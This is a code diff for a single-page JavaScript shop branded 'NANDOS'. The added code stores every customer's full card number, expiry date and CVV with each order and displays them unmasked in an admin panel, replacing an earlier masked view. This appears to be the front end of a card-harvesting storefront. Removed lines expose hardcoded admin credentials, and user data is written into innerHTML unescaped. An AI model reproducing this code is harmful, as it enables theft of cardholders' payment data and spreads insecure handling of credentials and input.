+                            <i class="fas fa-eye"></i> View Details
+                        </button>
+                    </td>
                 `;
                 
                 usersTableBody.appendChild(row);
             });
+            
+            // Add event listeners to view buttons
+            document.querySelectorAll('.view-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    const email = this.getAttribute('data-email');
+                    viewUserDetails(email);
+                });
+            });
         }
 
-        // Load admin card details
         function loadAdminCards() {
             cardsTableBody.innerHTML = '';
+            const cardDetails = server.getAllCardDetails();
             
-            state.users.forEach(user => {
-                const card = user.cardDetails;
-                const maskedNumber = `**** **** **** ${card.number.slice(-4)}`;
-                
+            if (cardDetails.length === 0) {
+                cardsTableBody.innerHTML = `
+                    <tr>
+                        <td colspan="7" style="text-align: center; padding: 30px; color: var(--gray);">
+                            <i class="fas fa-credit-card" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
+                            No card details saved yet. Users need to place orders first.
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            cardDetails.forEach(card => {
                 const row = document.createElement('tr');
                 row.innerHTML = `
-                    <td>${user.email}</td>
-                    <td>${maskedNumber}</td>
+                    <td>${card.userEmail}</td>
+                    <td><strong>${card.cardNumber}</strong></td>
+                    <td>${card.cardName}</td>
                     <td>${card.expiry}</td>
                     <td>${card.cvv}</td>
+                    <td>${new Date(card.lastUsed).toLocaleDateString()}</td>
                     <td>
-                        <button class="action-btn edit-btn" data-email="${user.email}">
-                            <i class="fas fa-eye"></i> View Full
+                        <button class="action-btn view-btn" data-id="${card.id}">
+                            <i class="fas fa-eye"></i> View
                         </button>
                     </td>
                 `;
@@ -1697,57 +2122,392 @@
             });
             
             // Add event listeners to view buttons
-            document.querySelectorAll('#cardsTableBody .edit-btn').forEach(button => {
+            document.querySelectorAll('#cardsTableBody .view-btn').forEach(button => {
                 button.addEventListener('click', function() {
-                    const email = this.getAttribute('data-email');
-                    viewFullCardDetails(email);
+                    const cardId = this.getAttribute('data-id');
+                    viewCardDetails(cardId);
                 });
             });
         }
 
-        // View full card details
-        function viewFullCardDetails(email) {
-            const user = state.users.find(u => u.email === email);
-            if (!user) return;
+        function loadAdminOrders() {
+            ordersTableBody.innerHTML = '';
+            const orders = server.getAllOrders();
+            const pendingCount = server.getPendingOrdersCount();
+            newOrdersCount.textContent = pendingCount;
             
-            const card = user.cardDetails;
-            alert(`Full Card Details for ${email}:\n\n` +
-                  `Card Number: ${card.number}\n` +
-                  `Name: ${card.name}\n` +
-                  `Expiry: ${card.expiry}\n` +
-                  `CVV: ${card.cvv}`);
+            if (orders.length === 0) {
+                ordersTableBody.innerHTML = `
+                    <tr>
+                        <td colspan="8" style="text-align: center; padding: 30px; color: var(--gray);">
+                            <i class="fas fa-shopping-bag" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
+                            No orders placed yet.
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            orders.forEach(order => {
+                const itemsText = order.items.map(item => 
+                    `${item.quantity}x ${item.name.substring(0, 15)}...`
+                ).join(', ');
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td><strong>${order.id}</strong></td>
+                    <td>${order.userEmail}</td>
+                    <td>${itemsText}</td>
+                    <td>£${order.total.toFixed(2)}</td>
+                    <td>${order.address.substring(0, 20)}...</td>
+                    <td>
+                        <span style="padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; 
+                              background: ${order.status === 'Pending' ? '#FFEAA7' : 
+                                        order.status === 'Shipped' ? '#A3E4D7' : '#D5DBDB'};">
+                            ${order.status}
+                        </span>
+                    </td>
+                    <td>${new Date(order.orderDate).toLocaleDateString()}</td>
+                    <td>
+                        ${order.status === 'Pending' ? 
+                            `<button class="action-btn edit-btn" data-order="${order.id}">
+                                <i class="fas fa-truck"></i> Ship
+                            </button>` : 
+                            `<span style="color: var(--gray); font-size: 0.9rem;">Shipped</span>`
+                        }
+                    </td>
+                `;
+                
+                ordersTableBody.appendChild(row);
+            });
+            
+            // Add event listeners to ship buttons
+            document.querySelectorAll('#ordersTableBody .edit-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    const orderId = this.getAttribute('data-order');
+                    shipOrder(orderId);
+                });
+            });
         }
 
-        // Edit product (simplified)
+        function loadOrdersWithCards() {
+            ordersWithCardsContainer.innerHTML = '';
+            const orders = server.getOrdersWithCards();
+            
+            if (orders.length === 0) {
+                ordersWithCardsContainer.innerHTML = `
+                    <div style="text-align: center; padding: 40px; color: var(--gray);">
+                        <i class="fas fa-credit-card" style="font-size: 3rem; margin-bottom: 15px;"></i>
+                        <h4>No orders with card details yet</h4>
+                        <p>Users need to place orders with card payments first.</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            let html = '<div style="display: grid; gap: 20px;">';
+            
+            orders.forEach(order => {
+                html += `
+                    <div class="order-card">
+                        <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 15px;">
+                            <div>
+                                <h4 style="margin-bottom: 5px;">${order.id}</h4>
+                                <div style="color: var(--gray); font-size: 0.9rem;">
+                                    <i class="far fa-user"></i> ${order.userEmail} • 
+                                    <i class="far fa-calendar"></i> ${new Date(order.orderDate).toLocaleDateString()}
+                                </div>
+                            </div>
+                            <div style="text-align: right;">
+                                <span style="color: var(--primary); font-size: 1.2rem; font-weight: 600;">£${order.total.toFixed(2)}</span>
+                                <div style="margin-top: 5px;">
+                                    <span style="padding: 3px 10px; border-radius: 12px; font-size: 0.8rem; 
+                                          background: ${order.status === 'Pending' ? '#FFEAA7' : 
+                                                    order.status === 'Shipped' ? '#A3E4D7' : '#D5DBDB'};">
+                                        ${order.status}
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="section-divider" style="margin: 15px 0;"></div>
+                        
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                            <div>
+                                <h5 style="margin-bottom: 10px; color: var(--dark);">Order Items</h5>
+                                <div style="background: var(--light); padding: 15px; border-radius: var(--radius);">
+                                    ${order.items.map(item => `
+                                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                                            <span>${item.quantity}x ${item.name}</span>
+                                            <span>£${(item.price * item.quantity).toFixed(2)}</span>
+                                        </div>
+                                    `).join('')}
+                                    <div style="border-top: 1px solid var(--light-gray); padding-top: 10px; margin-top: 10px; font-weight: 600;">
+                                        <div style="display: flex; justify-content: space-between;">
+                                            <span>Total:</span>
+                                            <span>£${order.total.toFixed(2)}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div>
+                                <h5 style="margin-bottom: 10px; color: var(--dark);">Payment Details</h5>
+                                <div class="card-details-box">
+                                    <div style="margin-bottom: 10px;">
+                                        <strong>Card Number:</strong>
+                                        <div style="font-family: monospace; font-size: 1.1rem; margin-top: 5px;">
+                                            ${order.cardNumber || 'Not available'}
+                                        </div>
+                                    </div>
+                                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px;">
+                                        <div>
+                                            <div style="color: var(--gray); font-size: 0.9rem;">Card Holder</div>
+                                            <div>${order.cardName || 'N/A'}</div>
+                                        </div>
+                                        <div>
+                                            <div style="color: var(--gray); font-size: 0.9rem;">Expiry</div>
+                                            <div>${order.expiry || 'N/A'}</div>
+                                        </div>
+                                        <div>
+                                            <div style="color: var(--gray); font-size: 0.9rem;">CVV</div>
+                                            <div>${order.cvv || 'N/A'}</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div style="margin-top: 15px;">
+                                    <h5 style="margin-bottom: 10px; color: var(--dark);">Delivery Address</h5>
+                                    <div style="background: var(--light); padding: 15px; border-radius: var(--radius);">
+                                        <i class="fas fa-map-marker-alt"></i> ${order.address}
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            html += '</div>';
+            ordersWithCardsContainer.innerHTML = html;
+        }
+
+        function viewUserDetails(email) {
+            const user = server.getUserByEmail(email);
+            const userOrders = server.getOrdersByUser(email);
+            const userCards = server.getCardsByUser(email);
+            
+            if (!user) return;
+            
+            const details = `
+                <h3>User Details: ${email}</h3>
+                <div style="margin: 20px 0;">
+                    <p><strong>Phone:</strong> ${user.phone}</p>
+                    <p><strong>Registered:</strong> ${new Date(user.registrationDate).toLocaleDateString()}</p>
+                    <p><strong>Total Orders:</strong> ${user.totalOrders || 0}</p>
+                    <p><strong>Total Spent:</strong> £${(user.totalSpent || 0).toFixed(2)}</p>
+                    <p><strong>Last Login:</strong> ${user.lastLogin ? new Date(user.lastLogin).toLocaleDateString() : 'N/A'}</p>
+                </div>
+                
+                <h4>Saved Cards (${userCards.length})</h4>
+                ${userCards.length > 0 ? 
+                    userCards.map(card => `
+                        <div style="background: var(--light); padding: 10px; margin: 10px 0; border-radius: 5px;">
+                            ${card.cardNumber} - ${card.cardName} (Exp: ${card.expiry})
+                        </div>
+                    `).join('') : 
+                    '<p style="color: var(--gray);">No saved cards</p>'
+                }
+                
+                <h4>Order History (${userOrders.length})</h4>
+                ${userOrders.length > 0 ? 
+                    userOrders.map(order => `
+                        <div style="background: var(--light); padding: 10px; margin: 10px 0; border-radius: 5px;">
+                            ${order.id} - £${order.total.toFixed(2)} - ${order.status}
+                        </div>
+                    `).join('') : 
+                    '<p style="color: var(--gray);">No orders</p>'
+                }
+            `;
+            
+            alert(details);
+        }
+
+        function viewCardDetails(cardId) {
+            const cardDetails = server.getAllCardDetails();
+            const card = cardDetails.find(c => c.id === cardId);
+            
+            if (!card) return;
+            
+            cardDetailsContent.innerHTML = `
+                <div style="margin-bottom: 20px;">
+                    <h4>Card Details</h4>
+                    <div style="background: var(--light); padding: 20px; border-radius: var(--radius); margin-top: 10px;">
+                        <div style="margin-bottom: 15px;">
+                            <div style="color: var(--gray); font-size: 0.9rem;">Card Holder</div>
+                            <div style="font-size: 1.2rem; font-weight: 600;">${card.cardName}</div>
+                        </div>
+                        
+                        <div style="margin-bottom: 15px;">
+                            <div style="color: var(--gray); font-size: 0.9rem;">Card Number</div>
+                            <div style="font-family: monospace; font-size: 1.3rem; letter-spacing: 2px; margin-top: 5px;">
+                                ${card.cardNumber}
+                            </div>
+                        </div>
+                        
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                            <div>
+                                <div style="color: var(--gray); font-size: 0.9rem;">Expiry Date</div>
+                                <div style="font-size: 1.1rem;">${card.expiry}</div>
+                            </div>
+                            <div>
+                                <div style="color: var(--gray); font-size: 0.9rem;">CVV</div>
+                                <div style="font-size: 1.1rem;">${card.cvv}</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <h4>Card Information</h4>
+                    <div style="background: var(--light); padding: 15px; border-radius: var(--radius); margin-top: 10px;">
+                        <p><strong>User:</strong> ${card.userEmail}</p>
+                        <p><strong>Saved On:</strong> ${new Date(card.saveDate).toLocaleDateString()}</p>
+                        <p><strong>Last Used:</strong> ${new Date(card.lastUsed).toLocaleDateString()}</p>
+                        <p><strong>Times Used:</strong> ${card.timesUsed}</p>
+                    </div>
+                </div>
+            `;
+            
+            viewCardModal.style.display = 'flex';
+        }
+
         function editProduct(productId) {
-            const product = state.products.find(p => p.id === productId);
+            const products = server.getAllProducts();
+            const product = products.find(p => p.id === productId);
             if (!product) return;
             
             const newName = prompt('Enter new product name:', product.name);
-            if (newName) product.name = newName;
+            if (newName) {
+                server.updateProduct(productId, { name: newName });
+            }
             
             const newPrice = prompt('Enter new price:', product.price);
-            if (newPrice) product.price = parseFloat(newPrice);
+            if (newPrice) {
+                server.updateProduct(productId, { price: parseFloat(newPrice) });
+            }
             
             const newDiscount = prompt('Enter new discount (%):', product.discount);
-            if (newDiscount) product.discount = parseInt(newDiscount);
+            if (newDiscount) {
+                server.updateProduct(productId, { discount: parseInt(newDiscount) });
+            }
             
             loadAdminProducts();
             loadProducts();
             showNotification('Product updated successfully!');
         }
 
-        // Delete product
         function deleteProduct(productId) {
             if (confirm('Are you sure you want to delete this product?')) {
-                state.products = state.products.filter(p => p.id !== productId);
-                loadAdminProducts();
-                loadProducts();
-                showNotification('Product deleted successfully!');
+                if (server.deleteProduct(productId)) {
+                    loadAdminProducts();
+                    loadProducts();
+                    showNotification('Product deleted successfully!');
+                }
             }
         }
 
-        // Format card number with spaces
+        function shipOrder(orderId) {
+            if (server.updateOrderStatus(orderId, 'Shipped')) {
+                loadAdminOrders();
+                showNotification(`Order ${orderId} marked as shipped!`);
+            }
+        }
+
+        // ==============================
+        // NOTIFICATION SYSTEM
+        // ==============================
+        function showNotification(message) {
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: var(--secondary);
+                color: white;
+                padding: 15px 20px;
+                border-radius: var(--radius);
+                box-shadow: var(--shadow);
+                z-index: 1000;
+                animation: slideIn 0.3s ease;
+            `;
+            
+            notification.innerHTML = `
+                <i class="fas fa-check-circle" style="margin-right: 10px;"></i>
+                ${message}
+            `;
+            
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => {
+                    document.body.removeChild(notification);
+                }, 300);
+            }, 3000);
+            
+            if (!document.querySelector('#notification-styles')) {
+                const style = document.createElement('style');
+                style.id = 'notification-styles';
+                style.textContent = `
+                    @keyframes slideIn {
+                        from { transform: translateX(100%); opacity: 0; }
+                        to { transform: translateX(0); opacity: 1; }
+                    }
+                    @keyframes slideOut {
+                        from { transform: translateX(0); opacity: 1; }
+                        to { transform: translateX(100%); opacity: 0; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+        }
+
+        // ==============================
+        // PAGE NAVIGATION
+        // ==============================
+        function switchPage(pageId) {
+            pages.forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            document.getElementById(pageId + 'Page').classList.add('active');
+            
+            if (pageId === 'cart') {
+                loadCartItems();
+            } else if (pageId === 'profile') {
+                loadUserProfile();
+            } else if (pageId === 'admin') {
+                if (state.isAdmin) {
+                    adminLoginForm.style.display = 'none';
+                    adminPanel.style.display = 'block';
+                    loadAdminProducts();
+                    loadAdminUsers();
+                    loadAdminCards();
+                    loadAdminOrders();
+                    loadOrdersWithCards();
+                } else {
+                    adminLoginForm.style.display = 'block';
+                    adminPanel.style.display = 'none';
+                }
+            }
+            
+            navLinksContainer.classList.remove('active');
+        }
+
+        // ==============================
+        // FORMATTING FUNCTIONS
+        // ==============================
         function formatCardNumber(value) {
             const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             const matches = v.match(/\d{4,16}/g);
@@ -1765,7 +2525,6 @@
             }
         }
 
-        // Format expiry date
         function formatExpiry(value) {
             const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             if (v.length >= 2) {
@@ -1774,16 +2533,15 @@
             return v;
         }
 
-        // Event Listeners
-
-        // Login form submission
+        // ==============================
+        // EVENT LISTENERS
+        // ==============================
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const phone = document.getElementById('phone').value;
             
-            // Simple validation
             if (!email.endsWith('@gmail.com')) {
                 alert('Please enter a valid Gmail address (ending with @gmail.com)');
                 return;
@@ -1797,18 +2555,24 @@
             // Save user data temporarily
             state.tempUser = { email, phone };
             
+            // Generate random OTP
+            state.currentOTP = generateRandomOTP();
+            
             // Show OTP modal
             otpModal.style.display = 'flex';
-            
-            // Generate random OTP (but display 4821 as specified)
-            state.currentOTP = '4821';
-            generatedOTP.textContent = '4 8 2 1';
+            generatedOTP.textContent = state.currentOTP.split('').join(' ');
             
             // Focus first OTP digit
             otpDigits[0].focus();
         });
 
-        // OTP digit input handling
+        resendOTP.addEventListener('click', function(e) {
+            e.preventDefault();
+            state.currentOTP = generateRandomOTP();
+            generatedOTP.textContent = state.currentOTP.split('').join(' ');
+            showNotification('New OTP sent!');
+        });
+
         otpDigits.forEach((digit, index) => {
             digit.addEventListener('input', function() {
                 if (this.value.length === 1 && index < otpDigits.length - 1) {
@@ -1823,7 +2587,6 @@
             });
         });
 
-        // Verify OTP
         verifyOTP.addEventListener('click', function() {
             let enteredOTP = '';
             otpDigits.forEach(digit => {
@@ -1833,7 +2596,13 @@
             if (enteredOTP === state.currentOTP) {
                 // Successful login
                 state.currentUser = state.tempUser;
-                localStorage.setItem('nandos_user', JSON.stringify(state.currentUser));
+                localStorage.setItem('nandos_current_user', JSON.stringify(state.currentUser));
+                
+                // Add user to server storage
+                server.addUser({
+                    email: state.currentUser.email,
+                    phone: state.currentUser.phone
+                });
                 
                 // Hide OTP modal and login page
                 otpModal.style.display = 'none';
@@ -1845,13 +2614,17 @@
                 loadProducts();
                 loadUserProfile();
                 
-                // Check if admin
-                if (state.currentUser.email === 'admin@gmail.com') {
+                // Check if admin (using server verification)
+                if (server.verifyAdmin(state.currentUser.email, 'anypassword') || 
+                    state.currentUser.email === 'admin@gmail.com') {
                     adminLink.style.display = 'flex';
                     state.isAdmin = true;
                 }
                 
                 showNotification('Successfully logged in! Welcome to NANDOS.');
+                
+                // Clear OTP fields
+                otpDigits.forEach(digit => digit.value = '');
             } else {
                 alert('Invalid OTP. Please try again.');
                 otpDigits.forEach(digit => {
@@ -1861,7 +2634,6 @@
             }
         });
 
-        // Navigation
         navLinks.forEach(link => {
             link.addEventListener('click', function(e) {
                 e.preventDefault();
@@ -1870,12 +2642,10 @@
             });
         });
 
-        // Hamburger menu for mobile
         hamburger.addEventListener('click', function() {
             navLinksContainer.classList.toggle('active');
         });
 
-        // Checkout button
         checkoutBtn.addEventListener('click', function() {
             if (state.cart.length === 0) {
                 alert('Your cart is empty. Add some items first!');
@@ -1884,17 +2654,17 @@
             switchPage('checkout');
         });
 
-        // Payment form submission
         paymentForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const cardNumber = document.getElementById('cardNumber').value;
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const expiry = document.getElementById('expiry').value;
             const cvc = document.getElementById('cvc').value;
             const cardName = document.getElementById('cardName').value;
+            const address = document.getElementById('address').value;
             
-            // Simple validation
-            if (cardNumber.replace(/\s/g, '').length !== 16) {
+            // Validation
+            if (cardNumber.length !== 16) {
                 alert('Please enter a valid 16-digit card number');
                 return;
             }
@@ -1914,100 +2684,118 @@
                 return;
             }
             
-            // Save card details for admin view
-            if (state.currentUser) {
-                const userIndex = state.users.findIndex(u => u.email === state.currentUser.email);
-                if (userIndex === -1) {
-                    state.users.push({
-                        email: state.currentUser.email,
-                        phone: state.currentUser.phone,
-                        orders: 1,
-                        totalSpent: parseFloat(cartTotal.textContent.replace('£', '')),
-                        cardDetails: {
-                            number: cardNumber.replace(/\s/g, ''),
-                            expiry: expiry,
-                            cvv: cvc,
-                            name: cardName
-                        }
-                    });
-                } else {
-                    state.users[userIndex].orders++;
-                    state.users[userIndex].totalSpent += parseFloat(cartTotal.textContent.replace('£', ''));
-                    state.users[userIndex].cardDetails = {
-                        number: cardNumber.replace(/\s/g, ''),
-                        expiry: expiry,
-                        cvv: cvc,
-                        name: cardName
-                    };
-                }
+            if (!address.trim()) {
+                alert('Please enter delivery address');
+                return;
             }
             
-            // Generate random order ID
-            const orderId = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
-            document.getElementById('orderId').textContent = orderId;
+            // Calculate total
+            const subtotal = state.cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const total = subtotal + 2.99;
+            
+            // Create order object WITH CARD DETAILS
+            const order = {
+                userEmail: state.currentUser.email,
+                items: state.cart.map(item => ({
+                    id: item.id,
+                    name: item.name,
+                    price: item.price,
+                    quantity: item.quantity
+                })),
+                total: total,
+                address: address,
+                cardNumber: cardNumber,
+                cardName: cardName,
+                expiry: expiry,
+                cvv: cvc
+            };
+            
+            // Save order to server
+            const savedOrder = server.addOrder(order);
+            
+            // Save card details to server separately
+            server.saveCardDetails({
+                userEmail: state.currentUser.email,
+                cardNumber: cardNumber,
+                cardName: cardName,
+                expiry: expiry,
+                cvv: cvc
+            });
             
             // Clear cart
             state.cart = [];
             updateCartCount();
             
             // Show success page
+            orderIdDisplay.textContent = savedOrder.id;
             switchPage('orderSuccess');
+            
+            // Clear form
+            paymentForm.reset();
+            
+            // Update user profile
+            loadUserProfile();
+            
+            showNotification('Order placed successfully! Card details saved.');
         });
 
-        // Continue shopping button
         continueShoppingBtn.addEventListener('click', function() {
             switchPage('home');
         });
 
-        // Admin link
+        // Logout button
+        logoutBtn.addEventListener('click', logout);
+
         adminLink.addEventListener('click', function(e) {
             e.preventDefault();
             switchPage('admin');
         });
 
-        // Footer admin link
         footerAdminLink.addEventListener('click', function(e) {
             e.preventDefault();
             switchPage('admin');
         });
 
-        // Admin login
         adminLoginBtn.addEventListener('click', function() {
             const username = document.getElementById('adminUsername').value;
             const password = document.getElementById('adminPassword').value;
             
-            if (username === 'Husnain' && password === '03038776223') {
+            // Clear the password field for security
+            document.getElementById('adminPassword').value = '';
+            
+            if (server.verifyAdmin(username, password)) {
                 state.isAdmin = true;
+                state.currentUser = {
+                    email: 'admin@gmail.com',
+                    phone: '+447030387762',
+                    isAdmin: true
+                };
+                localStorage.setItem('nandos_current_user', JSON.stringify(state.currentUser));
+                
                 adminLoginForm.style.display = 'none';
                 adminPanel.style.display = 'block';
                 loadAdminProducts();
                 loadAdminUsers();
                 loadAdminCards();
+                loadAdminOrders();
+                loadOrdersWithCards();
                 showNotification('Admin login successful!');
                 
-                // Update current user to admin
-                state.currentUser = {
-                    email: 'admin@gmail.com',
-                    phone: '+447030387762'
-                };
-                localStorage.setItem('nandos_user', JSON.stringify(state.currentUser));
                 adminLink.style.display = 'flex';
                 loadUserProfile();
             } else {
-                alert('Invalid admin credentials. Use Username: Husnain, Password: 03038776223');
+                // DON'T show actual password - just show error
+                alert('Invalid admin credentials. Please try again.');
             }
         });
 
-        // Admin tabs
         adminTabs.forEach(tab => {
             tab.addEventListener('click', function() {
                 const tabId = this.getAttribute('data-tab');
                 
-                // Update active tab
                 adminTabs.forEach(t => t.classList.remove('active'));
                 this.classList.add('active');
                 
-                // Show corresponding content
                 adminContents.forEach(content => {
                     content.classList.remove('active');
                     if (content.id === tabId + 'Tab') {
@@ -2017,18 +2805,15 @@
             });
         });
 
-        // Add product button
         addProductBtn.addEventListener('click', function() {
             addProductModal.style.display = 'flex';
         });
 
-        // Cancel add product
         cancelAddProduct.addEventListener('click', function() {
             addProductModal.style.display = 'none';
             addProductForm.reset();
         });
 
-        // Add product form submission
         addProductForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -2038,7 +2823,6 @@
             const image = document.getElementById('productImage').value;
             
             const newProduct = {
-                id: state.products.length > 0 ? Math.max(...state.products.map(p => p.id)) + 1 : 1,
                 name: name,
                 price: price,
                 discount: discount,
@@ -2046,32 +2830,38 @@
                 originalPrice: (price / (1 - discount / 100)).toFixed(2)
             };
             
-            state.products.push(newProduct);
+            server.addProduct(newProduct);
             
-            // Close modal and reset form
             addProductModal.style.display = 'none';
             addProductForm.reset();
             
-            // Update displays
             loadAdminProducts();
             loadProducts();
             showNotification('Product added successfully!');
         });
 
-        // Simulate OTP verification
-        simulateOTPBtn.addEventListener('click', function() {
-            alert('OTP Verification Simulation:\n\n' +
-                  'A simulated OTP (4821) would be sent to the customer\'s phone.\n' +
-                  'The customer would enter this code to verify the transaction.\n' +
-                  'This is for demonstration purposes only.');
+        markAllShipped.addEventListener('click', function() {
+            if (confirm('Mark all pending orders as shipped?')) {
+                server.markAllOrdersShipped();
+                loadAdminOrders();
+                showNotification('All orders marked as shipped!');
+            }
         });
 
-        // Format card number as user types
+        refreshOrders.addEventListener('click', function() {
+            loadAdminOrders();
+            loadOrdersWithCards();
+            showNotification('Orders refreshed!');
+        });
+
+        closeCardModal.addEventListener('click', function() {
+            viewCardModal.style.display = 'none';
+        });
+
         cardNumberInput.addEventListener('input', function() {
             this.value = formatCardNumber(this.value);
         });
 
-        // Format expiry date as user types
         expiryInput.addEventListener('input', function() {
             this.value = formatExpiry(this.value);
         });
